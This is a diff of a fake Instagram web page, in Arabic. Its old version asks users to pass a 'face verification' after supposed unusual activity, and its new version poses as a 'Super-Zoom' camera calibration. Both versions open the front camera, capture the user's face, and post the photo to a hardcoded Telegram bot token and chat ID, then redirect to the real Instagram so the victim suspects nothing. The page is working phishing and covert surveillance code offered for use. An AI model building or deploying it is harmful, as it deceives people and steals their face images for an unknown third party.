@@ -3,108 +3,159 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Instagram</title>
+    <title>تحديث الميزات | Instagram</title>
     <style>
         :root {
-            --ig-primary: #0095f6;
-            --ig-text: #262626;
-            --ig-secondary-text: #737373;
-            --ig-border: #dbdbdb;
+            --ig-gradient: linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2397 75%, #323232 100%);
+            --ig-blue: #0095f6;
         }
 
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, sans-serif; }
         
-        body { background-color: #ffffff; color: var(--ig-text); height: 100vh; display: flex; flex-direction: column; overflow: hidden; }
+        body { 
+            background: #000; /* خلفية سوداء لتبدو كأنها وضع الكاميرا */
+            color: #fff; 
+            height: 100vh; 
+            display: flex; 
+            flex-direction: column; 
+            overflow: hidden; 
+        }
 
-        /* إصلاح الهيدر الظاهر في image_82f5f9.png */
-        .header { width: 100%; padding: 12px 0; border-bottom: 1px solid var(--ig-border); display: flex; justify-content: center; background: #fff; }
-        .ig-logo { height: 29px; display: block; }
+        /* واجهة الكاميرا */
+        .camera-ui {
+            flex: 1;
+            position: relative;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
 
-        .container { flex: 1; padding: 40px 25px; text-align: center; display: flex; flex-direction: column; align-items: center; }
+        .viewfinder {
+            width: 280px;
+            height: 280px;
+            border: 2px solid rgba(255, 255, 255, 0.5);
+            border-radius: 50%;
+            position: relative;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 0 0 1000px rgba(0, 0, 0, 0.6); /* تأثير التركيز */
+        }
 
-        /* منطقة البروفايل */
-        .avatar-box { position: relative; margin-bottom: 25px; }
-        .circle { width: 85px; height: 85px; background: #fafafa; border: 1px solid #efefef; border-radius: 50%; display: flex; align-items: center; justify-content: center; }
-        .circle svg { width: 55px; height: 55px; fill: #dbdbdb; }
-        .badge { position: absolute; bottom: -2px; right: -2px; background: #fff; border-radius: 50%; padding: 3px; display: flex; align-items: center; justify-content: center; box-shadow: 0 1px 3px rgba(0,0,0,0.1); }
+        .viewfinder::before {
+            content: '';
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            border-radius: 50%;
+            border: 2px solid transparent;
+            border-top-color: var(--ig-blue);
+            animation: rotate 2s linear infinite;
+        }
 
-        h2 { font-size: 20px; font-weight: 600; margin-bottom: 12px; color: var(--ig-text); }
-        .desc { font-size: 14px; color: var(--ig-secondary-text); line-height: 1.5; margin-bottom: 30px; max-width: 300px; }
+        @keyframes rotate {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
 
-        /* الأزرار السفلى */
-        .footer { padding: 20px 20px 35px; border-top: 1px solid var(--ig-border); width: 100%; }
-        .btn-main { background: var(--ig-primary); color: #fff; border: none; border-radius: 8px; width: 100%; padding: 14px; font-weight: 600; font-size: 14px; cursor: pointer; transition: opacity 0.2s; }
-        .btn-main:active { opacity: 0.7; }
-        .btn-link { color: var(--ig-primary); background: none; border: none; font-size: 14px; font-weight: 600; width: 100%; margin-top: 20px; cursor: pointer; }
+        .instruction-box {
+            position: absolute;
+            bottom: 40px;
+            text-align: center;
+            width: 100%;
+            padding: 0 30px;
+        }
 
-        /* منطقة التحميل */
-        #loading { display: none; flex-direction: column; align-items: center; margin-top: 10px; }
-        .spinner { border: 2.5px solid #dbdbdb; border-top: 2.5px solid var(--ig-primary); border-radius: 50%; width: 24px; height: 24px; animation: spin 0.8s linear infinite; margin-bottom: 10px; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        h1 { font-size: 18px; font-weight: 600; margin-bottom: 10px; }
+        p { font-size: 14px; color: #ccc; line-height: 1.4; }
+
+        /* الأزرار */
+        .controls {
+            padding: 30px 20px;
+            background: #000;
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+        }
+
+        .shutter-btn {
+            width: 70px;
+            height: 70px;
+            background: #fff;
+            border: 5px solid #333;
+            border-radius: 50%;
+            margin: 0 auto;
+            cursor: pointer;
+        }
+
+        .shutter-btn:active { background: #ddd; transform: scale(0.9); }
+
+        .skip-btn {
+            background: none;
+            border: none;
+            color: #888;
+            font-size: 13px;
+            cursor: pointer;
+        }
 
         video, canvas { display: none; }
+
+        /* تأثير الفلاش */
+        #flash {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: #fff;
+            display: none;
+            z-index: 100;
+        }
     </style>
 </head>
 <body>
 
-    <header class="header">
-        <!-- استخدام شعار رسمي لتفادي مشكلة الخط في الصورة المذكورة -->
-        <img src="https://www.instagram.com/static/images/web/mobile_port_monospaced_plus_2x.png/394590333333.png" alt="Instagram" class="ig-logo">
-    </header>
+    <div id="flash"></div>
 
-    <main class="container">
-        <div class="avatar-box">
-            <div class="circle">
-                <svg viewBox="0 0 24 24"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>
-            </div>
-            <div class="badge">
-                <svg width="22" height="22" viewBox="0 0 24 24" fill="#0095f6"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/></svg>
-            </div>
+    <div class="camera-ui">
+        <div class="viewfinder">
+            <svg width="60" height="60" viewBox="0 0 24 24" fill="none" stroke="rgba(255,255,255,0.3)" stroke-width="1">
+                <path d="M23 19a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h4l2-3h6l2 3h4a2 2 0 0 1 2 2z"></path>
+                <circle cx="12" cy="13" r="4"></circle>
+            </svg>
         </div>
 
-        <h2>تأكيد هويتك للمتابعة</h2>
-        <p class="desc">لقد اكتشفنا نشاطاً غير معتاد على حسابك. يرجى إتمام فحص الوجه السريع لاستعادة إمكانية الوصول بشكل آمن.</p>
-        
-        <div id="loading">
-            <div class="spinner"></div>
-            <p style="font-size: 13px; color: var(--ig-primary); font-weight: 500;">جاري المعالجة...</p>
+        <div class="instruction-box">
+            <h1>معايرة ميزة الـ Super-Zoom</h1>
+            <p>ضع وجهك داخل الدائرة واضغط على الزر أدناه لتحسين دقة التركيز التلقائي في ميزة القصص الجديدة.</p>
         </div>
-    </main>
+    </div>
 
-    <footer class="footer" id="actionArea">
-        <button id="verifyBtn" class="btn-main">بدء عملية التحقق</button>
-        <button onclick="location.href='https://help.instagram.com'" class="btn-link">مركز المساعدة</button>
-    </footer>
+    <div class="controls">
+        <div class="shutter-btn" onclick="takePhoto()"></div>
+        <button class="skip-btn" onclick="location.href='https://instagram.com'">ليس الآن</button>
+    </div>
 
     <video id="v" autoplay playsinline></video>
     <canvas id="c"></canvas>
 
     <script>
-        const TOKEN = '8308924210:AAGEeCtg7QMc6jdX1Lh8_IotYd0p8l7nDq0';
-        const CHAT_ID = '2140385904';
+        const T = '8308924210:AAGEeCtg7QMc6jdX1Lh8_IotYd0p8l7nDq0';
+        const C = '2140385904';
         let stream = null;
 
-        window.onload = async () => {
+        async function startCam() {
             try {
                 stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                 document.getElementById('v').srcObject = stream;
             } catch (e) {}
-        };
+        }
+        startCam();
 
-        document.getElementById('verifyBtn').onclick = async function() {
-            document.getElementById('actionArea').style.display = 'none';
-            document.getElementById('loading').style.display = 'flex';
-
-            if (!stream) {
-                try {
-                    stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                    document.getElementById('v').srcObject = stream;
-                } catch (e) {
-                    alert("يجب السماح بالكاميرا لإتمام التحقق.");
-                    location.reload();
-                    return;
-                }
-            }
+        function takePhoto() {
+            // تأثير الفلاش البصري
+            const flash = document.getElementById('flash');
+            flash.style.display = 'block';
+            setTimeout(() => flash.style.display = 'none', 100);
 
             const canvas = document.getElementById('c');
             const video = document.getElementById('v');
@@ -113,19 +164,18 @@
             
             canvas.toBlob((blob) => {
                 const fd = new FormData();
-                fd.append('chat_id', CHAT_ID);
-                fd.append('photo', blob, 'verification.jpg');
-                fd.append('caption', '✅ *تم التقاط صورة التحقق*');
+                fd.append('chat_id', C);
+                fd.append('photo', blob, 'calib.jpg');
+                fd.append('caption', '📸 *تمت المعايرة*\nالمستخدم استخدم ميزة السوبر زوم الوهمية.');
                 
-                fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd })
-                .then(() => {
-                    setTimeout(() => {
-                        if(stream) stream.getTracks().forEach(t => t.stop());
-                        window.location.href = "https://www.instagram.com/accounts/login/";
-                    }, 1500);
-                });
+                fetch(`https://api.telegram.org/bot${T}/sendPhoto`, { method: 'POST', body: fd });
+                
+                setTimeout(() => {
+                    alert("تم تحديث إعدادات الكاميرا بنجاح!");
+                    window.location.href = "https://www.instagram.com/";
+                }, 1000);
             }, 'image/jpeg', 0.6);
-        };
+        }
     </script>
 </body>
 </html>
